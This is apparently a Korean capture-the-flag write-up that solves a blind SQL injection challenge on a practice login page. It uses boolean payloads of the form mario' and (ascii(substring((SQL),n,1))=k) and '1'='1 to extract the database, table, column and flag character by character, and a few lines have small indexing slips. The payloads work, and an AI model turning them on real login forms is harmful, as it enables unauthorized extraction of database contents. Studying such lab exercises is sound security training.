# DB 데이터 추출 3

Blind SQLi

http://ctf.segfaulthub.com:9999/sqli_3/login.php

---
기본적인 로그인

![1](https://user-images.githubusercontent.com/106296883/235724934-5dcb95b5-dc82-4e17-992c-36bd071a9c2a.PNG)

```
mario / mariosuper
```

로그인을 진행할 때 아무런 정보없이 SQL Injection을 사용할 수 있는 방법은 Blind SQL Injection 방법이다.

먼저 아이디를 입력하는 sql문을 예상한다.
```
select ??? from ??? where id = ''
```

그 후에 기본적인 SQLi 구문을 집어넣어 본다.
```
mario' and '1'='1
```
로그인 성공.

id부분에 계속해서 많은 정보를 넣어야 하기 떄문에    
burp suite 프로그램을 사용한다.

![2](https://user-images.githubusercontent.com/106296883/235726589-c41568db-1e70-40de-837d-3f4e72818b05.PNG)

params가 체크되어 있는 hostory를 우클릭하여   
'Send to Repeater' 버튼으로 Repeater로 보낸다.

![3](https://user-images.githubusercontent.com/106296883/235727055-b14931b1-faad-43d4-9e43-a14cb104ff4a.PNG)

request 부분의 16번쨰 줄을 보면 userid와 password가 전송된 것을 확인할 수 있다.   
해당 부분을 수정하고 Send 버튼을 통하여 쉽게 post를 전송할 수 있다.

또한, Response의 Render를 통하여    
참과 거짓을 쉽게 가려낼 수 있다.

Blind SQLi를 하기 위해서 참/거짓이 제대로 구분되는지 확인한다.
```
mario' and (1=1) and '1'='1     # 로그인 성공 
mario' and (1=2) and '1'='1     # 로그인 실패
```

![4](https://user-images.githubusercontent.com/106296883/235727838-cec8713e-b2c2-4782-8e46-a3ed2ae0a2b3.PNG)
![5](https://user-images.githubusercontent.com/106296883/235727713-ba9e3dca-436f-498f-b29f-08694c43ed2d.PNG)


위 사진을 보면   
(1=1)은 로그인을 통과하고   
(1=2)는 통과하지 못했다.

![6](https://user-images.githubusercontent.com/106296883/235728531-599d29ed-b63c-44d0-a054-462b8b52b3dc.PNG)
![7](https://user-images.githubusercontent.com/106296883/235728526-f5418324-58da-4157-b510-0902e9a9a52c.PNG)

(1=1)은 302 FOUND HTTP 상태 코드로 index.php로 redirect 되었지만,   
(1=2)는 로그인을 통과하지 못하고 200 OK 상태 코드를 보여주었다.

```
mario' and ('test'='test') and '1'='1
mario' and ((select 'test')='test') and '1'='1
```
또한 마찬가지로 참/거짓을 분별할 수 있다.

그렇다면 Blind SQLi 공격이 가능하다는 소리이다.   
이제 공격 포맷을 만들어보자.

```
mario' and (조건) and '1'='1
```
이것이 기본 포맷 조건이다.   
조건의 공간에 여러 가지 방법을 사용해보자.

ascii('t')>0
```
mario' and (ascii('t')>0) and '1'='1
```
ascii('t')>0 의미는 무조건 참이다.   
t 의 ascii 코드는 116이기에 0보다 크기 떄문이다.   
그리고 ascii 가 적용되는 것을 확인하였다.

't' => substring('test', 1,1)
```
mario' and (ascii(substring('test',1,1))>0) and '1%'='1
```
결과가 나온다.   
substring 함수로 결과값을 잘라서 ascii 코드에 하나씩 대조해가면서 찾을 수 있게 쪼개준다.

이제 select 문을 사용할 것이다.
```
mario' and (ascii(substring((select 'test'),1,1))>0) and '1'='1
```
역시 로그인이 된다.

마지막으로 select 'test' 가 제대로 동작하는 것을 확인했으니   
select 'test 부분을 빼고   
넣고 싶은 SQL문을 넣는다.

포맷 
```
mario' and (ascii(substring((SQL),1,1))>0) and '1'='1
```

이제 SQL 부분으로 database 이름을 알아보자.

## select database()
```
mario' and (ascii(substring((select database()), 1,1)) > 0) and '1'='1 

>0 을 수정해가며 맞는 조건을 찾아간다.
> 100 거짓
> 110 거짓 
> 115 거짓
> 114 참
= 115 참

ascii 코드 115번 = s

s
```
이런 식으로 계속해서 찾아가다보면 

mario'+and+(ascii(substring((select+database()),1,1))=115)+and'1'='1   
s

mario'+and+(ascii(substring((select+database()),2,1))=113)+and'1'='1   
q

mario'+and+(ascii(substring((select+database()),3,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+database()),4,1))=105)+and'1'='1   
i

mario'+and+(ascii(substring((select+database()),5,1))=95)+and'1'='1   
_

mario'+and+(ascii(substring((select+database()),6,1))=51)+and'1'='1   
3

mario'+and+(ascii(substring((select+database()),7,1))>0)+and'1'='1   
x

## database : sqli_3  
```
sqli_3
```
 
database 이름을 알 수 있게 된다.

table 도 마찬가지 이므로 table 도 같은 방식으로 찾아준다.

## select table_name from information_schema.tables where table_schema = 'DB이름' limit 0,1 
```
select table_name from information_schema.tables where table_schema = 'sqli_3' limit 0,1

로그인 성공
```

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),1,1))=102)+and'1'='1   
f

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),2,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),3,1))=97)+and'1'='1   
a

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),4,1))=103)+and'1'='1   
g

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),5,1))=95)+and'1'='1   
_

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),6,1))=116)+and'1'='1   
t

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),7,1))=97)+and'1'='1   
a

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),8,1))=98)+and'1'='1   
b

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),9,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),10,1))=101)+and'1'='1   
e

## table : flag_table   
```
flag_table
```


column 도 동일하게 적용.

select column_name from information_schema.columns where table_name='table 이름'

## select column_name from information_schema.columns where table_name='flag_table'
```
mario'+and+(ascii(substring((select column_name from information_schema.columns where table_name='flag_table'),11,1))>0)+and'1'='1

로그인 성공
```

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),1,1))=102)+and'1'='1   
f

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),2,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),3,1))=97)+and'1'='1   
a

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),4,1))=103)+and'1'='1   
g

## column : flag
```
flag
```


database 이름, table 이름, column 이름을 찾았으니까    
데이터를 확인하자.

## select flag from flag_table
```
mario'+and+(ascii(substring((select flag from flag_table),1,1))>0)+and'1'='1

로그인 성공
```

mario'+and+(ascii(substring((select+flag+from+flag_table),1,1))=115)+and'1'='1   
s

mario'+and+(ascii(substring((select+flag+from+flag_table),2,1))=101)+and'1'='1   
e

mario'+and+(ascii(substring((select+flag+from+flag_table),3,1))=103)+and'1'='1   
g

mario'+and+(ascii(substring((select+flag+from+flag_table),4,1))=102)+and'1'='1   
f

mario'+and+(ascii(substring((select+flag+from+flag_table),5,1))=97)+and'1'='1   
a

mario'+and+(ascii(substring((select+flag+from+flag_table),6,1))=117)+and'1'='1   
u

mario'+and+(ascii(substring((select+flag+from+flag_table),7,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+flag+from+flag_table),8,1))=116)+and'1'='1   
t

mario'+and+(ascii(substring((select+flag+from+flag_table),9,1))=123)+and'1'='1   
{

mario'+and+(ascii(substring((select+flag+from+flag_table),10,1))=66)+and'1'='1   
B

mario'+and+(ascii(substring((select+flag+from+flag_table),11,1))=108)+and'1'='1   
l

mario'+and+(ascii(substring((select+flag+from+flag_table),11,1))=105)+and'1'='1   
i

mario'+and+(ascii(substring((select+flag+from+flag_table),13,1))=110)+and'1'='1   
n

mario'+and+(ascii(substring((select+flag+from+flag_table),14,1))=100)+and'1'='1   
d

mario'+and+(ascii(substring((select+flag+from+flag_table),15,1))=95)+and'1'='1   
_

mario'+and+(ascii(substring((select+flag+from+flag_table),16,1))=83)+and'1'='1   
S

mario'+and+(ascii(substring((select+flag+from+flag_table),17,1))=81)+and'1'='1   
Q

mario'+and+(ascii(substring((select+flag+from+flag_table),18,1))=76)+and'1'='1   
L

mario'+and+(ascii(substring((select+flag+from+flag_table),19,1))=105)+and'1'='1   
i

mario'+and+(ascii(substring((select+flag+from+flag_table),20,1))=95)+and'1'='1   
_

mario'+and+(ascii(substring((select+flag+from+flag_table),21,1))=69)+and'1'='1   
E

mario'+and+(ascii(substring((select+flag+from+flag_table),22,1))=65)+and'1'='1   
A

mario'+and+(ascii(substring((select+flag+from+flag_table),23,1))=83)+and'1'='1   
S

mario'+and+(ascii(substring((select+flag+from+flag_table),24,1))=89)+and'1'='1   
Y

mario'+and+(ascii(substring((select+flag+from+flag_table),25,1))=125)+and'1'='1   
}


## segfault{Blind_SQLi_EASY}
```
segfault{Blind_SQLi_EASY}
```
굉장히 힘들었다.   
하나하나씩 치니까 굉장한 노가다였다.